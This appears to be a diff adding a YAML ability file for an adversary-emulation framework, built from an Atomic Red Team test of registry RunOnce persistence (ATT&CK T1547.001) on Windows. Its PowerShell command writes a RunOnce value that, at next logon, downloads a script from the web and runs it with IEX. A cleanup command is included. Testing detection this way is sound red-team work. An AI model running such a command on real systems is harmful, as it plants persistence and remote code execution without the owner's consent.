@@ -1,0 +1,25 @@
+---
+- id: 3c0760559a620aad7664cdf98f486127
+  name: PowerShell Registry RunOnce
+  description: 'RunOnce Key Persistence via PowerShell
+
+    Upon successful execution, a new entry will be added to the runonce item in the
+    registry.
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1547.001
+    name: 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
+  platforms:
+    windows:
+      psh:
+        command: $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce";
+          set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object
+          Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"'
+        payloads: []
+        cleanup: Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
+          -Name "NextRun" -Force -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
